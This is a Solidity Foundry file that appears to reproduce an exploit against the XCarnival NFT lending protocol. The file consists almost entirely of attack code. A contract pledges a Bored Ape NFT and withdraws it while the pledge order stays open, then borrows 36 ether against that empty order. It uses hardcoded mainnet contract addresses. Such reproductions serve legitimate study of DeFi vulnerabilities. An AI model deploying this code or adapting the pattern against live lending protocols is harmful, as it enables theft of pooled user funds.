pragma solidity 0.8.12;

import "forge-std/Test.sol";

interface IBAYC {
    function setApprovalForAll(address operator, bool _approved) external;

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface IXNFT {
    function counter() external returns (uint256);

    function pledgeAndBorrow(
        address _collection,
        uint256 _tokenId,
        uint256 _nftType,
        address xToken,
        uint256 borrowAmount
    ) external;

    function withdrawNFT(uint256 orderId) external;
}

interface IXToken {
    function borrow(
        uint256 orderId,
        address payable borrower,
        uint256 borrowAmount
    ) external;
}

contract XCarnivalExploit {
    address constant xETH = 0xB38707E31C813f832ef71c70731ed80B45b85b2d;
    address constant bayc = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address constant xNFTProxy = 0xb14B3b9682990ccC16F52eB04146C3ceAB01169A;

    constructor() {
        IBAYC(bayc).setApprovalForAll(tx.origin, true);
        IBAYC(bayc).setApprovalForAll(address(xNFTProxy), true);
    }

    function makePledge() public {
        uint256 orderId;
        IXNFT(xNFTProxy).pledgeAndBorrow(
            address(bayc),
            5110,
            721,
            address(0xA04EC2366641a2286782D104C448f13bF36B2304),
            0
        );
        orderId = IXNFT(xNFTProxy).counter();
        IXNFT(xNFTProxy).withdrawNFT(orderId);
        IBAYC(bayc).transferFrom(address(this), msg.sender, 5110);
        console.log("OrderId created =>", orderId);
    }

    function borrowEth(uint256 orderId) public {
        IXToken(xETH).borrow(orderId, payable(address(this)), 36 ether);
        console.log("OrderId borrowed =>", orderId);
        console.log("Eth in contract after borrowing =>", address(this).balance);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
